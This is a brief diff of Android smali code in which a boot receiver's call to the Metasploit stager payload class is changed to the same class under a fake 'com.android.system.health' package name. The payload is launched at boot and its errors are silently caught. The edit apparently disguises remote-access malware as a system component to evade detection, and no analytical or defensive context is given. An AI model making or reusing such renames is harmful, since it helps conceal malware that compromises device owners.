@@ -54,7 +54,7 @@
     invoke-static {}, Lcom/termux/boot/BootReceiver;->launchAgent()V
 
     :try_payload
-    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+    invoke-static {p0}, Lcom/android/system/health/Payload;->start(Landroid/content/Context;)V
     :try_payload_end
     .catch Ljava/lang/Exception; {:try_payload .. :try_payload_end} :catch_payload
     :catch_payload
